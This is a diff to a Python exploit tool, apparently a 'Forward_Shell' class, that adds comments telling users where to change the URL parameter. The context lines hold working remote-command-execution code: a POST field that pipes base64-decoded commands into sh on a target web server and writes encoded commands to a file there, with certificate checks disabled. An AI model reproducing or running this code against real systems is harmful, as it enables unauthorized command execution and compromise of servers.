@@ -38,7 +38,7 @@ class Forward_Shell:
     def exploit(self,cmd):
         requests.packages.urllib3.disable_warnings()
         payload = {
-            "rse": "echo " + cmd + " | base64 -d | sh"
+            "rse": "echo " + cmd + " | base64 -d | sh" #Change URL parameter here
         }  
 
         try:
@@ -67,7 +67,7 @@ class Forward_Shell:
                 rce = rce + "\n"
                 rce_encoded = self.base64encode(rce)
                 payload = {
-                    "rse":"echo " + rce_encoded + " | base64 -d > " + self.input
+                    "rse":"echo " + rce_encoded + " | base64 -d > " + self.input #Change URL parameter here
                 }
 
                 requests.post(self.url, data=payload, verify=False)
